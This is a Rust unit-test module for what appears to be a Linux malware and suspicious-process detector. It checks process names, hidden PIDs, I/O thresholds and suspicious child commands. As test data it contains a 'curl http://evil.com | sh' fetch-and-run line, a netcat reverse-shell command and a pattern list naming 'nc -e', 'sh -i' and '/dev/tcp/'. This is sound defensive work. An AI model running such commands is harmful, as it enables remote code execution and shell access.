#[cfg(test)]
mod tests {
    #[test]
    fn test_known_malware_detection() {
        let known_malware = vec![
            "kinsing", "kdevtmpfsi", "perfctl", "cshell",
            "kaiji", "ddostf", "tsunami", "billgates",
        ];

        let processes = vec![
            ("kinsing", true),
            ("python3", false),
            ("kdevtmpfsi_miner", true),
            ("systemd", false),
            ("perfctl", true),
        ];

        for (process_name, should_be_malware) in processes {
            let process_lower = process_name.to_lowercase();
            let is_malware = known_malware.iter()
                .any(|&malware| process_lower.contains(malware));
            assert_eq!(is_malware, should_be_malware, "Malware detection failed for '{}'", process_name);
        }
    }

    #[test]
    fn test_hidden_process_name_detection() {
        let processes = vec![
            (".hidden_miner", true),
            ("python", false),
            (".config_loader", true),
            ("bash", false),
        ];

        for (name, should_be_hidden) in processes {
            let is_hidden = name.starts_with('.');
            assert_eq!(is_hidden, should_be_hidden, "Hidden name detection failed for '{}'", name);
        }
    }

    #[test]
    fn test_orphaned_process_detection() {
        // Process with PPID=1 (init) but high PID (not system process)
        let test_cases = vec![
            (1, 100, false),    // Low PID, init parent = system process
            (1, 5000, true),    // High PID, init parent = suspicious
            (500, 5001, false), // Normal parent
        ];

        for (ppid, pid, should_be_suspicious) in test_cases {
            let is_orphaned = ppid == 1 && pid > 1000;
            assert_eq!(is_orphaned, should_be_suspicious,
                "Orphaned process detection failed for PID {} PPID {}", pid, ppid);
        }
    }

    #[test]
    fn test_legitimate_daemon_whitelist() {
        let legitimate_daemons = vec![
            "systemd", "cron", "sshd", "rsyslogd",
            "dbus-daemon", "networkd", "dockerd",
        ];

        let processes = vec![
            ("systemd", true),
            ("sshd", true),
            ("malware_daemon", false),
            ("dockerd", true),
        ];

        for (name, should_be_legitimate) in processes {
            let is_legitimate = legitimate_daemons.iter()
                .any(|&daemon| name.contains(daemon));
            assert_eq!(is_legitimate, should_be_legitimate, "Daemon whitelist failed for '{}'", name);
        }
    }

    #[test]
    fn test_pid_range_checking() {
        // Standard PID brute force range
        let min_pid = 1;
        let max_pid = 32768;

        assert!(1 >= min_pid && 1 <= max_pid);
        assert!(32768 >= min_pid && 32768 <= max_pid);
        assert!(!(0 >= min_pid && 0 <= max_pid));
        assert!(!(40000 >= min_pid && 40000 <= max_pid));
    }

    #[test]
    fn test_high_io_detection() {
        let io_threshold = 100_000_000; // 100MB

        let processes = vec![
            ("backup", 500_000_000, true),  // 500MB I/O
            ("idle", 1_000, false),         // 1KB I/O
            ("miner", 200_000_000, true),   // 200MB I/O
        ];

        for (name, io_bytes, should_flag) in processes {
            let is_high_io = io_bytes > io_threshold;
            assert_eq!(is_high_io, should_flag, "High I/O detection failed for '{}'", name);
        }
    }

    #[test]
    fn test_socket_inode_matching() {
        // Test socket inode format matching
        let fd_links = vec![
            ("socket:[12345]", Some(12345)),
            ("pipe:[67890]", None),
            ("/dev/pts/0", None),
            ("socket:[999]", Some(999)),
        ];

        for (link, expected_inode) in fd_links {
            let inode = if link.starts_with("socket:[") {
                link.strip_prefix("socket:[")
                    .and_then(|s| s.strip_suffix("]"))
                    .and_then(|s| s.parse::<u64>().ok())
            } else {
                None
            };

            assert_eq!(inode, expected_inode, "Socket inode parsing failed for '{}'", link);
        }
    }

    #[test]
    fn test_process_cmdline_analysis() {
        let cmdlines = vec![
            (vec!["python3", "script.py"], "python3 script.py"),
            (vec!["bash", "-c", "curl http://evil.com | sh"], "bash -c curl http://evil.com | sh"),
            (vec![], ""),
        ];

        for (cmdline_vec, expected_string) in cmdlines {
            let joined = cmdline_vec.join(" ");
            assert_eq!(joined, expected_string);
        }
    }

    #[test]
    fn test_hidden_process_discrepancy() {
        // Test logic for detecting hidden processes
        use std::collections::HashSet;

        let mut proc_pids = HashSet::new();
        proc_pids.insert(1);
        proc_pids.insert(100);
        proc_pids.insert(200);

        let syscall_pids = vec![1, 100, 200, 300]; // 300 is hidden

        for pid in syscall_pids {
            if !proc_pids.contains(&pid) {
                // This PID is hidden from /proc
                assert_eq!(pid, 300, "Hidden process detection failed");
            }
        }
    }

    #[test]
    fn test_suspicious_parent_child_relationship() {
        // bash spawning suspicious processes
        let suspicious_children = vec![
            ("bash", "nc -e /bin/sh 192.168.1.100 4444", true),  // Reverse shell
            ("bash", "python script.py", false),                  // Normal
            ("init", "cron", false),                              // Normal
        ];

        let suspicious_commands = vec!["nc -e", "sh -i", "/dev/tcp/"];

        for (parent, child_cmd, should_be_suspicious) in suspicious_children {
            let is_suspicious = suspicious_commands.iter()
                .any(|&cmd| child_cmd.contains(cmd));
            assert_eq!(is_suspicious, should_be_suspicious,
                "Parent-child relationship detection failed");
        }
    }

    #[test]
    fn test_process_state_analysis() {
        // Process states: R=running, S=sleeping, D=disk sleep, Z=zombie, T=stopped
        let states = vec![
            ('R', "running", false),
            ('S', "sleeping", false),
            ('Z', "zombie", true),    // Suspicious
            ('D', "disk_sleep", true), // Can be suspicious if persistent
            ('T', "stopped", true),    // Suspicious
        ];

        for (state_char, description, is_suspicious) in states {
            let suspicious = matches!(state_char, 'Z' | 'D' | 'T');
            assert_eq!(suspicious, is_suspicious, "Process state '{}' detection failed", description);
        }
    }
}
